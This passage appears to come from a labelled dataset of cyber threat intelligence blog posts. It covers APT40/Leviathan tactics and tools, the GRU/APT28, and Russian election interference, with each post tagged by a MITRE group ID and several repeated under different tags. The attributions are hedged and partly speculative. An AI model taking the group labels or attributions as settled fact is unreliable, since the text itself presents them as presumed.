Newzoo.(2018). Mobile Revenues Account for More Than 50% of the Global Games Market as It Reaches $137.9 Billion in 2018. <https://newzoo.com/insights/articles/global-games-market-reaches-137-9-billion-in-2018-mobile-games-take-half/> [5] Global Game Services.(2017, 1 January). Asia Game Markets | LAI Global Game Services. Retrieved from <https://www.lai.com/en/asia-game-markets> [6] Kaspersky Lab Global Research and Analysis Team.(2013). Winnti. Retrieved from <https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/20134508/winnti-more-than-just-a-game-130410.pdf> [7]Fung, A. (2016). Global Game Industries and Cultural Policy (3rd edit.).Hong Kong."
annoctr,annoctr/AnnoCTR/text/train/lab52_2019-05-30_leviathan-geostrategy-and-ttp-technical.txt,lab52_2019-05-30_leviathan-geostrategy-and-ttp-technical,G0065,"Leviathan: Geostrategy and TTP (Tactics, Techniques and Procedures) May 30, 2019 **Executive summary**: ---------------------- FireEye posted a relevant report regarding one of the most active threat groups; Leviathan, also known as TEMP, Periscope or TEMP. Jumper. This APT is supposedly attributed to the Chinese government ([1]). In this report is shown how involved the cyber threat groups are in the geostrategy of countries. China is the main supplier of Europe in several products. Approximately since 2009, China has aimed to build up a maritime route known as OBOR (One Belt, One Road). The main goal of this project is to develop a safe trading corridor to export Chinese products to all European countries in a fluid way with lower international tax. However, the geostrategic trouble begins in the South Chinese Sea as there are many bordering countries which are trying to control the area by carrying out military operations with their navy forces. This fact poses a major threat for the effectiveness of the OBOR route. Presumably, to afford the conflict China has designed a strategic plan to quickly develop its navy to become one of the most important in the world. Leviathan has carried out several cyberattacks against the following countries: Cambodia, Belgium, Germany, Hong Kong, Phillipine Islands, Malaysia, Norway, Saudi Arabia, Switzerland and the United States. All of these countries are involved in the OBOR route. The fields of the organizations which have been cyber attacked by Leviathan belong to the logistic, engineering, naval technology and naval defense industry ([1]). **Geostratic analysis of the APT 40 campaign:** ----------------------------------------------- Currently, there are relevant military tensions at the beginning of the route. In geostrategic terms, the Paracelso and Spratlkly Islands are key points for China and the surrounding countries to guarantee the normal vessel traffic inside the OBOR route ([11]). If a country blocked the traffic of this area, the negative consequences for the Chinese and the world’s economy would be considerably dangerous. A general map of the whole OBOR route and all the ports involved is shown below ([9]). As can be seenin the graph above, currently the most desired route for the Chinese government is by crossing the South Sea through the Malacca Channel, Arabic Sea to the Suez Canal to end in the Port of Piraeus. The main diplomatic conflicts in the OBOR route are among United States, Malaysia, Taiwan, Vietnam, Japan, Indonesia and the Philippine Islands ([12]). The following map shows the specific areas that are diplomatically confronted with China and the rest of the countries mentioned before. ![](https://lab52.es/blog/wp-content/uploads/2019/05/cao-2.jpg) *Illustration 1: OBOR Route* ![](https://lab52.es/blog/wp-content/uploads/2019/05/cao-3-1.jpg) *Illustration 2: International waters claimed by countries.* In this APT 40 or Leviathan campaign, the countries that received cyberattacks were USA, Malaysia, Cambodia, Brunei, Philippine Islands and Hong Kong. The relation among the States involved in this geostrategic conflict in the Chinese Sea and the organizations that have been targeted by APT 40 is highly strong. Moreover, it is important to mention that Saudi Arabia, Germany, Norway and UK has been targeted by Leviathan ([1]). ![](https://lab52.es/blog/wp-content/uploads/2019/05/cao-414.png) *Illustration 3: SouthEast countries targeted by Leviathan* APT 40 has designed and carried out this campaign with the main goal of collecting classified information from navy and defense organizations. With this classified information, China, supposedly expects to develop its navy infrastructure to reach its aim of becoming a significant military power with high competencies in “blue waters” or oceanic waters ([13]). The following graph shows the evolution of the Chinese naval military development. As it is shown, in the last 20 years the Chinese Army has exponentially developed their military tools and navy resources ([10]). China is trying to be efficient and competitive in military terms as the United States. ![](https://lab52.es/blog/wp-content/uploads/2019/05/cao-5-2-1024x538.png) *Illustration 4: Comparison between the US military resources and the Chinese military resources.* FireEye considers that presumably, Leviathan is an APT associated to the Chinese government and its main task and duties are focused on carrying out cyber-attacks to collect classified information. Among some of the evidence collected to conclude the attribution of this campaign was the Chinese time zone (UTC+8), as the majority of the operations were executed in this gap of time. Whois” data has also been collected from the domains suggesting that the infrastructure is located in China. Futhermore, some APT 40 IP have been identified and localized in China as 112.66.188[.]28 which is associated with a Chinese VPN. As can be seen in the following graph, this address is connected to a Chinese server from Telecom located in Haian. Although the geolocation of that kind of service and the location of an IP is not a determinant element to get an attribution, in this case there is another fact that reinforces the theory that China carried out the cyberattacks. It is important to mention that the Command and Control that was intercepted by FireEye was configured in Chinese. ![](https://lab52.es/blog/wp-content/uploads/2019/05/8682AAB1-416D-4FB6-B739-89D65CE1008B.jpg) *Illustration 5: Análisis con maltego de la IP 112.66.160.20* LIFE CYCLE In the following part, there is a brief description about each stage followed by this threat group ([1]). First part of the cyberattack: Several techniques used in this phase have been identified. However, there are some techniques that have been used in the majority of this campaign’s cases. * Web Shells: In organizations that were previously compromised, usually the threat actors leavesleft the servers infected, just in case they want to exfiltrate more information in the future, as they still guarantee access to the system. * Spear Phishing: The threat group uses phishing emails to targeted organizations. In these campaigns they made use of links to Google drive to download the malware in their spear phishing emails with malicious attachments. In their campaigns they mostly exploited the following vulnerabilities: * o CVE-2012-0158 [2] o CVE-2017-0199 [3] o CVE-2017-8759 [5] o CVE-2017-11882 [6] Process to compromise When the threat actor has been able to access the systems they would try to get alternative points of access to the organization by expanding new backdoors or collecting user credentials. Specifically, the new backdoors used in the organization ([8]): China Chopper: Web Shell that is able to execute code on compromised computers. This way, attackers can send commands via HTTP POST to infect servers. The web Shell is able to: list directories, access databases and in general any action allowed by .NET. Photo (also called: “dersubi”): A DLL that is the backdoor, this one has the following capabilities: ▪ Listing directories, files and storage. ▪ Opening of reverse shells. ▪ Taking screenshots, video and audio recording. ▪ Processing creation ▪ Modifying registry keys. ▪ Keylogging ▪ Modifying files. Badflick: Backdoor with the ability to modify the file system, open reverse shells and modify the configuration of the C2. Airbreak (also called “Orz”): Malware which was programmed in JavaScript, with the capability to receive commands to execute from legitimate pages ([7]). Beacon: It is a malware distributed by the Cobalt Strike platform. This malware is able to inject and execute codes and exfiltrate files. The group usually collects corporate VPN credentials, as well as other remote administration services (see: SSH, RDP, etc. Escalation of privileges: As in the previous stage, the group uses different tools and techniques to carry out the privilege escalation. In this stage, the group mainly focuses on collecting credentials from both open and private sources, passwords and hashes. We could expect the use of tools like HOMEFRY, a tool based on Badflick and Airbreak with the ability to obtain and crack passwords. As well as the use of native legitimate tools such as Windows Credential Editor or ProcDump. Internal recognition: Leviathan collects passwords to access other computers in the network. Moreover, the attackers take advantage of the native services of the system that would be activated by (RDP, SSH, etc.). Specifically, some of the TTPs associated with this stage would be: • MURKYSHELL: malware capable of scanning ports and network enumerations. • Use of native Windows tools such as net.exe • Use of web shells in the internal network, as internal servers usually are less secure than external servers. Lateral movement: This stage is based on the information gathered in the previous stages. Leviathan is accustomed to using its own scripts, web shells and accessible services of the computers in the network. For each compromised computer, the group usually executes a malware and performs new procedures of information recognition and theft tasks. Use of native tools such as at.exe (Task Scheduler) and net.exe (network resource management tool) MURKYTOP: Command line tool for equipment recognition ([8]). DISHCLOTH: Brute force tool to attack different services. Persistence: Leviathan uses backdoors and web shells to maintain persistence. * Some of the tools used in the previous phases also serve this purpose. Use of Web Shells as China Chopper. • Use of detection evasion techniques generating innocuous traffic. • Use of TCP ports 80 and 443. Exfiltration : The threat group uses compressing tools to encrypt the information before exfiltrating it. Moreover, the group develops its own tools to properly carry out y this stage. The following graph, provides the different tools used by the group throughout its life cycle. ![](https://lab52.es/blog/wp-content/uploads/2019/05/cao-77.png) Illustration 6: Malware used by Leviathan in each phase. FireEye MITRE ATT&CK TTP Matrix: ======================== The table below shows the TTP and Framework ATT&CK of MITRE ([4]): | **Domain** | **ID** | **Name** | **Description** | | Enterprise | T1078 | Valid Accounts | The group uses valid accounts to access to VPN, SSH and RDP services.| | Enterprise | T1192 | SpearPhishing Link | Leviathan uses Google Drive links in their Spear-phishing campaigns.| | Enterprise | T1193 | SpearPhishing Attachment | Leviathan spear-phishing emails typically leverage malicious attachments.| | Enterprise | T1189 | Drive by Compromise | Leviathan usually compromises strategic websites and the group also relies on multiple web shells.| | Enterprise | T1059 | Command-Line Interface | Leviathan uses different command line tools, like net.exe or MURKYTOP. | | Enterprise | T1064 | Scripting | Leviathan uses custom scripts for internal reconnaissance and lateral movement.| | Enterprise | T1053 | Scheduled Task | Leviathan uses at.exe for lateral movement | | Enterprise | T1100 | Web Shell | Leviathan relies on web shells such as China chopper.| | Enterprise | T1110 | Brute Force | Leviathan uses custom brute force tools as DISHCLOTH. | | Enterprise | T1003 | Credential Dumping | Leviathan uses a mix of credential harvesting tools and password dumpers like Windows Credential Editor or their malware HOMEFRY. | | Enterprise | T1081 | Credential in Files | Leviathan uses a mix of credential harvesting tools and password dumpers like Windows Credential Editor or their malware HOMEFRY. | | Enterprise | T1046 | Network Service Scanning | Leviathan uses MURKYSHELL and net.exe for network service scanning.| | Enterprise | T1210 | Explotation of Remote Service | Leviathan usually compromises internal servers with known vulnerabilities.| | Enterprise | T1076 | Remote Desktop Protocol | Leviathan leverages RDP for lateral movement.| | Enterprise | T1021 | Remote Service | Leviathan leverages RDP and SSH to facilitate internal reconnaissance.| | Enterprise | T1002 | Data Compressed | Leviathan uses rar.exe to compress and encrypt files.| | Enterprise | T1022 | Data Encrypted | Leviathan uses rar.exe to compress and encrypt files.| | Enterprise | T1043 | Commonly Used Port | Leviathan uses mainly the TCP ports 80 and 443 for communications with their C2.| **Conclusions**: ---------------- The government of China is presumably using APT 40 to collect classified information from the governments that are involved in the OBOR route against the Chinese international policies. As we can see the defense industry is an important target for APT 40 as China aimed to grow and develop its defense resources to become one of the most important maritime army of the world. All the suppliers related with the defense industry should be aware that they would be an important target for APT 40 as well. The threat group would cyberattack the defense suppliers with the purpose of compromising the final defense organization. Currently, for China and the rest of the countries with economies completely focused on exportations, it is highly important to keep the OBOR route under control of non-incidents as 80% of international trading is carried out by vessels. **References**: --------------- [1] <https://www.fireeye.com/blog/threat-research/2019/03/apt40-examining-a-china-nexus-espionage-actor.html> [2] <http://cve.circl.lu/cve/CVE-2012-0158> [3] http://cve.circl.lu/cve/CVE-2017-0199 [4] <https://attack.mitre.org/matrices/enterprise/> [5] <http://cve.circl.lu/cve/CVE-2017-8759> [6] <http://cve.circl.lu/cve/CVE-2017-11882> [7] Same TTP example, carried out by another group <https://www.welivesecurity.com/2017/06/06/turlas-watering-hole-campaign-updated-firefox-extension-abusing-instagram/> [8] <https://www.fireeye.com/blog/threat-research/2018/03/suspected-chinese-espionage-group-targeting-maritime-and-engineering-industries.html> [9] EOM. (s.f.). Rough waters in the China Sea. (Spanish) <https://elordenmundial.com/aguas-revueltas-en-el-mar-de-la-china-meridional/> [10][https://assets.bwbx.io/images/users/iqjWHBFdfxIU/iqLEpwHQiQe0/v0/1200×630.png](https://assets.bwbx.io/images/users/iqjWHBFdfxIU/iqLEpwHQiQe0/v0/1200x630.png) [11] Izquierdo, J. C. (s.f.). China’s global strategy to defend its interests. (Spanish) <http://www.ieee.es/Galerias/fichero/docs_opinion/2019/DIEEEO04_2019JAVCAR-China.pdf> [12] Parra Pérez, A. (s.f.). The geopolitical game of the new Silk Road in Asia. (Spanish) <http://www.ieee.es/Galerias/fichero/docs_opinion/2018/DIEEEO126_2018AGUPAR-RutaSeda.pdf> [13] Paino, L. (s.f.). Geopolitics in the Pacific Indian Ocean. (Spanish) <http://www.ieee.es/Galerias/fichero/docs_opinion/2018/DIEEEO59-2018_Indo-Pacifico_NvaChina_LauraPaino.pdf>"
annoctr,annoctr/AnnoCTR/text/train/lab52_2019-10-18_cyber-gru-xiv-conclusions.txt,lab52_2019-10-18_cyber-gru-xiv-conclusions,G0007,"(Cyber) GRU (XIV): conclusions October 18, 2019 In this work, we have analyzed mainly the structure, targets and TTP of the GRU in the cyber field, based on the information brought to light during 2018 and which allowed to obtain a detailed knowledge of the Service and its activities, not only to intelligence services, but also to poor analysts like us who do not have all the capabilities that a state can have. With what we know, even analyzing public sources, we have access to information that in some cases should be considered sensitive and that, without a doubt, is being -or has been- analyzed by services from all over the world, starting with Russia itself. The fact that we know the GRU better than a year ago does not mean that now it is a worse service than before; it will remain part of the elite, fulfilling its missions and acting “*in any part of the world where it is required*“, said one of its former directors. The GRU, or APT28, or whatever you want to name it, will continue to be a very important player in the cyber field and, of course, in the non-cyber realm. We all make mistakes, and the GRU made them on that occasion – and they were published. However, it is more of a concern in certain circles that the GRU failed in its operations than to have leaked the identities or modus operandi of some of its members. Currently, we are aware of the cyber activity of two Service Units that work in a coordinated manner to benefit the interests of the Russian Federation ; one of them, Unit 26165 which is responsible for the technical operations of the GRU (CNE and CNA), while the other one is Unit 74455, which is responsible for the psychological operations (PSYOP) of the Service. Their joint work reflects the Russian conception of information warfare, different from the Western conception, which is the handling of stolen information to favor Russian interests and which is identified with two fields of action: the confrontation of technical information and the confrontation of psychological information. APT28 is linked to the GRU, if it is not the name given to the cyber division of the Service. It has possibly been operational since 1953, the year that Military Unit 26165 was founded. So instead of ‘fancy bear’ we should call it ‘old bear’ (and change the logo to that of the attached image) and perhaps not only steals information for the benefit of the Russian government, but uses it intelligently in psychological operations. And it not only has NEC capabilities, like any other intelligence service in the world, but also NAC capabilities, since we must remember that it is a military service and will therefore carry out pure attack operations, not just information theft. ![](https://www.securityartwork.es/wp-content/uploads/2019/05/bear.jpg) APT28. Source: Old Bear Press We hope this work will help a little bit to get to know the GRU better, which we talked about briefly when we discussed the issue of the Russian cyber-intelligence community and which lately, for all that has happened, deserved a series of its own. Now, we have to wait for new public information that allows us to also analyze the cyber division of the FSB. Until a few months ago, the FSB was better known than the GRU but surely it has aspects that we cannot even imagine…"
annoctr,annoctr/AnnoCTR/text/train/lab52_2019-10-18_cyber-gru-xiv-conclusions.txt,lab52_2019-10-18_cyber-gru-xiv-conclusions,G0035,"(Cyber) GRU (XIV): conclusions October 18, 2019 In this work, we have analyzed mainly the structure, targets and TTP of the GRU in the cyber field, based on the information brought to light during 2018 and which allowed to obtain a detailed knowledge of the Service and its activities, not only to intelligence services, but also to poor analysts like us who do not have all the capabilities that a state can have. With what we know, even analyzing public sources, we have access to information that in some cases should be considered sensitive and that, without a doubt, is being -or has been- analyzed by services from all over the world, starting with Russia itself. The fact that we know the GRU better than a year ago does not mean that now it is a worse service than before; it will remain part of the elite, fulfilling its missions and acting “*in any part of the world where it is required*“, said one of its former directors. The GRU, or APT28, or whatever you want to name it, will continue to be a very important player in the cyber field and, of course, in the non-cyber realm. We all make mistakes, and the GRU made them on that occasion – and they were published. However, it is more of a concern in certain circles that the GRU failed in its operations than to have leaked the identities or modus operandi of some of its members. Currently, we are aware of the cyber activity of two Service Units that work in a coordinated manner to benefit the interests of the Russian Federation ; one of them, Unit 26165 which is responsible for the technical operations of the GRU (CNE and CNA), while the other one is Unit 74455, which is responsible for the psychological operations (PSYOP) of the Service. Their joint work reflects the Russian conception of information warfare, different from the Western conception, which is the handling of stolen information to favor Russian interests and which is identified with two fields of action: the confrontation of technical information and the confrontation of psychological information. APT28 is linked to the GRU, if it is not the name given to the cyber division of the Service. It has possibly been operational since 1953, the year that Military Unit 26165 was founded. So instead of ‘fancy bear’ we should call it ‘old bear’ (and change the logo to that of the attached image) and perhaps not only steals information for the benefit of the Russian government, but uses it intelligently in psychological operations. And it not only has NEC capabilities, like any other intelligence service in the world, but also NAC capabilities, since we must remember that it is a military service and will therefore carry out pure attack operations, not just information theft. ![](https://www.securityartwork.es/wp-content/uploads/2019/05/bear.jpg) APT28. Source: Old Bear Press We hope this work will help a little bit to get to know the GRU better, which we talked about briefly when we discussed the issue of the Russian cyber-intelligence community and which lately, for all that has happened, deserved a series of its own. Now, we have to wait for new public information that allows us to also analyze the cyber division of the FSB. Until a few months ago, the FSB was better known than the GRU but surely it has aspects that we cannot even imagine…"
annoctr,annoctr/AnnoCTR/text/train/lab52_2019-10-18_cyber-iii-cold-war-hack.txt,lab52_2019-10-18_cyber-iii-cold-war-hack,G0007,"(Cyber) III Cold War: Hack the vote? October 18, 2019 As you now, the DHS (Department of Homeland Security) along with the ODNI (Office of the Director of National Intelligence) [formally accused](https://www.odni.gov/index.php/newsroom/press-releases/215-press-releases-2016/1423-joint-dhs-odni-election-security-statement) Russia of meddling in the past US presidential elections with techniques from the burning information warfare and various cyberattacks. Let’s take a (somewhat delayed) look at this. ![This image has an empty alt attribute; its file name is imagen1post.png] (https://www.securityartwork.es/wp-content/uploads/2016/10/imagen1post.png) It is not the first time that USA launches accusations of this caliber, it did so when it accused China of stealing trade secrets in 2014. An accusation of this kind could involve, officially or unofficially, attacks on Russian IT infrastructures that posed a headache for Putin and his allies. [According to statements in the NYT](http://www.nytimes.com/2016/10/09/us/politics/what-options-does-the-us-have-after-accusing-russia-of-hacks.html?_r=1) taking this type of action would involve too much risk with elections less than a month away; cyberattacks by a power like Russia against the US electronic voting system could wreak havoc. It should also be noted that the electoral system is still not considered a critical infrastructure of the nation, although it may increase their criticality shortly. As we told you in the first issue of this saga [(in spanish)](https://www.securityartwork.es/2015/10/20/cyber-guerra-fria-i-ataque-a-tv5monde/), Russia, like other States, has (always supposedly) conducted PSYOP (Psychological Operations) to misinform, to create confusion or discord for the sake of their own benefit, and that includes operations in cyberspace. Historically, Russia is an expert in the use of information for personal gain (just study propaganda operations of Spetsnaz). Events, among others, like the parliamentary elections in Ukraine in 2007, the Ukraine-Russia gas dispute in 2005, [the power outage](https://www.securityartwork.es/2016/02/23/the-blackout-revisited/) the Ukraine experienced earlier this year or the Russian-Chechen conflict manifest the (obvious and known) Russian interest in its geographical area of influence, actions allegedly attributed to **APT28** which we discussed in the second issue of this saga [(in spanish)](https://www.securityartwork.es/2016/07/19/cyber-guerra-fria-ii-grupo-sofacy/). Returning to the other side of the pond … recently in Illinois there was an intrusion into the electoral electronic system which involved **the theft of 200,000 voters’ registers**. The same happened in Arizona, but it seems that despite having suffered a similar intrusion they failed to filter information. The White House Press Secretary, Josh Earnest, [explained](https://www.whitehouse.gov/the-press-office/2016/08/30/press-briefing-press-secretary-josh-earnest-8302016) that the attack was under investigation, though back then they did not dare ensure which government or criminal group could be behind the attack. ![](https://www.securityartwork.es/wp-content/uploads/2016/10/imagen2post.png) The (dis) information is power ------------------------------ The ‘Russian presence’ has been hanging around for months around the American electoral environment. This summer, Wikileaks published about 20,000 emails stolen from officers of the Democratic National Committee, [many of them embarrassing] (http://theduran.com/julian-assange-says-1700-emails-hillary-clintons-collection-proves-sold-weapons-isis-syria/). This leak cost the resignation of the president of the Democratic Party, damaged (and continues to…) the reputation of Clinton’s entourage, and caused them to be accused (between racks) of the attack on the Russian intelligence, as published in ‘[The Washington Post] (https://www.washingtonpost.com/politics/hacked-emails-cast-doubt-on-hopes-for-party-unity-at-democratic-convention/2016/07/24/a446c260-51a9-11e6-b7de-dfe509430c39_story.html?hpid=hp_hp-top-table-main_campaign-132pm%3Ahomepage%2Fstory)‘ and ‘[The New York Times] (http://www.nytimes.com/2016/07/25/us/politics/donald-trump-russia-emails.html?%20hp&action=click&pgtype=Homepage&clickSource=story-heading&module=first-column-region&region=top-news&WT.nav=top-news&_r=0)’. Groups like APT28 (already mentioned) and APT29 were identified as possible culprits. As PSYOP was a perfect play; at the right time, and measuring well the tempos, all the dirty rags of the party begin to be exfiltrated, a new scandal added to the ” Hillary’s emails ” case, when it was uncovered that she used a private mail server to handle, supposedly, confidential information during her time as Secretary of State. ![](https://www.securityartwork.es/wp-content/uploads/2016/10/imagen3post-740x346.png) As my friend Miguel (who you can read about in [this recommended blog)](http://www.areopago21.org/) tells me, “*You must remember that throughout history, Russia and the USSR before that, has a long history of “[active measures](https://en.wikipedia.org/wiki/Active_measures)” to manipulate, ranging from propagandistic actions, the falsification of official documents to more [extreme domestic violence](https://www.amazon.es/Mitrokhin-Archive-Europe-Penguin-History/dp/0140284877)*“. We’ve already talked of [The Agency](http://www.nytimes.com/2015/06/07/magazine/the-agency.html?_r=0) in another article in this series, Russian troll factory, supposedly serving the Kremlin. To add more ‘juice’ to the matter, [Michael T. Flynn](https://en.wikipedia.org/wiki/Michael_T._Flynn), former director of the DIA (Defense Intelligence Agency) and criticized for his affinity and good relations with Russia, is one of Trump’s advisors and his name even came up to occupy the vicepresidency. The return of the KGB. The increase of espionage capabilities. -------------------------------------------------------------- According to some Russian [unofficial sources](http://kommersant.ru/doc/3093174), Russia is planning to create a super-security agency called **Ministry of State Security** (MGB, МГБ), a name used in the past to define the Soviet intelligence agency of the Stalin era between 1946 and 1953. Its main functions were to be the ‘secret police’, espionage and counterespionage and promoting a policy of surveillance and monitoring to maintain control and prevent disloyalty. Although this information has not been confirmed by official sources, several experts on Russian security services and a former KGB colonel -Gennady Gudkov- said it would be very likely indeed that Putin carried out this reform in the intelligence services with the aim, among others, that the management of security agencies be more effective, and help eradicate corruption within agencies. This new ministry would be trained on the FSB, could also understand the FSO and the SVR, resembling, according to Kommersant and other experts with the KGB, in which Putin in fact managed to acquire the rank of lieutenant colonel. Let us recall that the KGB was split into separate institutions during the collapse of the Soviet Union in 1991. According to the researcher, [Andrei Soldatov](http://echo.msk.ru/programs/albac/41311/), some of the military operations in cyberspace attributed to Russia were coordinated by the FSB by which a ‘new KGB’ in these times, could mean the return to the old cold war in a new more technological environment and of which we know Russia has a strong technical control. But as I said, **this is all speculation**. We must keep in mind that United Russia, the party of Vladimir Putin, obtained 343 of the 450 seats that make up the Duma, increasing its parliamentary representation to 105 seats, thus becoming a constitutional majority. But the question before us is … Could Russia (or any other State / Group) alter the outcome of the elections by taking advantage of cyberattacks. Is Putin trying to meddle in the US presidential elections. Is there a conspiracy of the Kremlin to help Trump in the race for the White House. Let’s just stay with the first question or we will fry our brains… Could the outcome of the elections be altered by taking advantage of cyberattacks. ---------------------------------------------------------------------------------- [Rapid7 Community](https://community.rapid7.com/community/infosec/blog/2016/09/19/hacking-the-election-what-to-expect) points out that in many states the online vote has no encryption, they have doubts about the security of the voting machines, and agree that while technology makes our life easier, it also introduces some risks, but that, in this case they would be quite controlled and altering the outcome of the elections would be very unlikely. In [Krypt3ia](https://krypt3ia.wordpress.com/2016/10/11/scenarios-on-outcomes-from-russian-information-operations-on-the-us-2016-election/) they pose some possible attack scenarios –sure that our readers who have a very twisted mind, would come up with one or more- and the potential damages they would make if they were successful are the following: 1.**Manipulation of the voting machine.** Let us remember that the voters commonly do it through an Electoral System of Optical Scanning or voting machines. Physical access to them is needed to manipulate them. It seems unlikely to manipulate them according to official sources, but not impossible. This situation has been highly discussed over the past few years. 2.**Manipulation of voter lists.** A scenario based on the latest developments. Hacking the database of voters in key states could cause chaos on Election Day. One could, for example, manipulate the voting intention polls, disable voters on the voting day claiming they have requested a postal vote … etc. In the year 2000, [some sources](http://elpais.com/diario/2004/10/29/internacional/1099000816_850215.html) claimed fraud in Florida by manipulating certain parameters in the lists of voters – it was requested that criminals be deleted from them (as they cannot vote) and, it is argued, more than 90,000 people were eventually eliminated who did have the right to vote. (In line with this, I leave you the documentary [Hacking Democracy](https://es.wikipedia.org/wiki/Hacking_Democracy) documenting some research of US citizens on anomalies / irregularities with the electronic voting system they detected during the presidential election to the USA in 2000 and 2004, especially in the County of Volusia (Florida)). The US-CERT is aware of the risks involved with databases of voter registration, and even offers a [number of tips](https://www.us-cert.gov/ncas/tips/ST16-001) for prevention. 3.**Disruption of the electronic process.** Imagine malware in electoral machines that could block them. We would have to stop using them and other means would be used such as ballots, other machines, thus considerably lengthening the process and entering into a state of contingency (…we have already done this in Spain without anyone hacking us :). Let us remember that in the Ukraine, three days before the elections, the main servers of the Central Electoral Commission [were compromised](https://sputniknews.com/voiceofrussia/news/2014_05_23/CyberBerkut-announces-destruction-of-electronic-system-of-Ukraines-Central-Election-Commission-5809/) and the Security Service of the Ukraine [also discovered](http://www.pravda.com.ua/news/2014/05/23/7026217/) a virus installed on the servers, which would have destroyed the election results. In any of the three scenarios, **confidence in the electronic system would be partially or totally degraded and the entire electoral system would be in doubt**. In fact, it is not necessary for these cyberattacks to be successful, but to make enough ‘noise’ to sow doubt in the system and that in itself is a significant damage in this information war in which we are immersed. Finally, I must state that Russia considers all these accusations as ‘anti-Russian hysteria’, and you, what do you think. ¿Information warfare by Clinton. Trump . Or is it really Putin. We only know that we know nothing."
annoctr,annoctr/AnnoCTR/text/train/lab52_2019-10-18_cyber-iii-cold-war-hack.txt,lab52_2019-10-18_cyber-iii-cold-war-hack,G0016,"(Cyber) III Cold War: Hack the vote? October 18, 2019 As you now, the DHS (Department of Homeland Security) along with the ODNI (Office of the Director of National Intelligence) [formally accused](https://www.odni.gov/index.php/newsroom/press-releases/215-press-releases-2016/1423-joint-dhs-odni-election-security-statement) Russia of meddling in the past US presidential elections with techniques from the burning information warfare and various cyberattacks. Let’s take a (somewhat delayed) look at this. ![This image has an empty alt attribute; its file name is imagen1post.png] (https://www.securityartwork.es/wp-content/uploads/2016/10/imagen1post.png) It is not the first time that USA launches accusations of this caliber, it did so when it accused China of stealing trade secrets in 2014. An accusation of this kind could involve, officially or unofficially, attacks on Russian IT infrastructures that posed a headache for Putin and his allies. [According to statements in the NYT](http://www.nytimes.com/2016/10/09/us/politics/what-options-does-the-us-have-after-accusing-russia-of-hacks.html?_r=1) taking this type of action would involve too much risk with elections less than a month away; cyberattacks by a power like Russia against the US electronic voting system could wreak havoc. It should also be noted that the electoral system is still not considered a critical infrastructure of the nation, although it may increase their criticality shortly. As we told you in the first issue of this saga [(in spanish)](https://www.securityartwork.es/2015/10/20/cyber-guerra-fria-i-ataque-a-tv5monde/), Russia, like other States, has (always supposedly) conducted PSYOP (Psychological Operations) to misinform, to create confusion or discord for the sake of their own benefit, and that includes operations in cyberspace. Historically, Russia is an expert in the use of information for personal gain (just study propaganda operations of Spetsnaz). Events, among others, like the parliamentary elections in Ukraine in 2007, the Ukraine-Russia gas dispute in 2005, [the power outage](https://www.securityartwork.es/2016/02/23/the-blackout-revisited/) the Ukraine experienced earlier this year or the Russian-Chechen conflict manifest the (obvious and known) Russian interest in its geographical area of influence, actions allegedly attributed to **APT28** which we discussed in the second issue of this saga [(in spanish)](https://www.securityartwork.es/2016/07/19/cyber-guerra-fria-ii-grupo-sofacy/). Returning to the other side of the pond … recently in Illinois there was an intrusion into the electoral electronic system which involved **the theft of 200,000 voters’ registers**. The same happened in Arizona, but it seems that despite having suffered a similar intrusion they failed to filter information. The White House Press Secretary, Josh Earnest, [explained](https://www.whitehouse.gov/the-press-office/2016/08/30/press-briefing-press-secretary-josh-earnest-8302016) that the attack was under investigation, though back then they did not dare ensure which government or criminal group could be behind the attack. ![](https://www.securityartwork.es/wp-content/uploads/2016/10/imagen2post.png) The (dis) information is power ------------------------------ The ‘Russian presence’ has been hanging around for months around the American electoral environment. This summer, Wikileaks published about 20,000 emails stolen from officers of the Democratic National Committee, [many of them embarrassing] (http://theduran.com/julian-assange-says-1700-emails-hillary-clintons-collection-proves-sold-weapons-isis-syria/). This leak cost the resignation of the president of the Democratic Party, damaged (and continues to…) the reputation of Clinton’s entourage, and caused them to be accused (between racks) of the attack on the Russian intelligence, as published in ‘[The Washington Post] (https://www.washingtonpost.com/politics/hacked-emails-cast-doubt-on-hopes-for-party-unity-at-democratic-convention/2016/07/24/a446c260-51a9-11e6-b7de-dfe509430c39_story.html?hpid=hp_hp-top-table-main_campaign-132pm%3Ahomepage%2Fstory)‘ and ‘[The New York Times] (http://www.nytimes.com/2016/07/25/us/politics/donald-trump-russia-emails.html?%20hp&action=click&pgtype=Homepage&clickSource=story-heading&module=first-column-region&region=top-news&WT.nav=top-news&_r=0)’. Groups like APT28 (already mentioned) and APT29 were identified as possible culprits. As PSYOP was a perfect play; at the right time, and measuring well the tempos, all the dirty rags of the party begin to be exfiltrated, a new scandal added to the ” Hillary’s emails ” case, when it was uncovered that she used a private mail server to handle, supposedly, confidential information during her time as Secretary of State. ![](https://www.securityartwork.es/wp-content/uploads/2016/10/imagen3post-740x346.png) As my friend Miguel (who you can read about in [this recommended blog)](http://www.areopago21.org/) tells me, “*You must remember that throughout history, Russia and the USSR before that, has a long history of “[active measures](https://en.wikipedia.org/wiki/Active_measures)” to manipulate, ranging from propagandistic actions, the falsification of official documents to more [extreme domestic violence](https://www.amazon.es/Mitrokhin-Archive-Europe-Penguin-History/dp/0140284877)*“. We’ve already talked of [The Agency](http://www.nytimes.com/2015/06/07/magazine/the-agency.html?_r=0) in another article in this series, Russian troll factory, supposedly serving the Kremlin. To add more ‘juice’ to the matter, [Michael T. Flynn](https://en.wikipedia.org/wiki/Michael_T._Flynn), former director of the DIA (Defense Intelligence Agency) and criticized for his affinity and good relations with Russia, is one of Trump’s advisors and his name even came up to occupy the vicepresidency. The return of the KGB. The increase of espionage capabilities. -------------------------------------------------------------- According to some Russian [unofficial sources](http://kommersant.ru/doc/3093174), Russia is planning to create a super-security agency called **Ministry of State Security** (MGB, МГБ), a name used in the past to define the Soviet intelligence agency of the Stalin era between 1946 and 1953. Its main functions were to be the ‘secret police’, espionage and counterespionage and promoting a policy of surveillance and monitoring to maintain control and prevent disloyalty. Although this information has not been confirmed by official sources, several experts on Russian security services and a former KGB colonel -Gennady Gudkov- said it would be very likely indeed that Putin carried out this reform in the intelligence services with the aim, among others, that the management of security agencies be more effective, and help eradicate corruption within agencies. This new ministry would be trained on the FSB, could also understand the FSO and the SVR, resembling, according to Kommersant and other experts with the KGB, in which Putin in fact managed to acquire the rank of lieutenant colonel. Let us recall that the KGB was split into separate institutions during the collapse of the Soviet Union in 1991. According to the researcher, [Andrei Soldatov](http://echo.msk.ru/programs/albac/41311/), some of the military operations in cyberspace attributed to Russia were coordinated by the FSB by which a ‘new KGB’ in these times, could mean the return to the old cold war in a new more technological environment and of which we know Russia has a strong technical control. But as I said, **this is all speculation**. We must keep in mind that United Russia, the party of Vladimir Putin, obtained 343 of 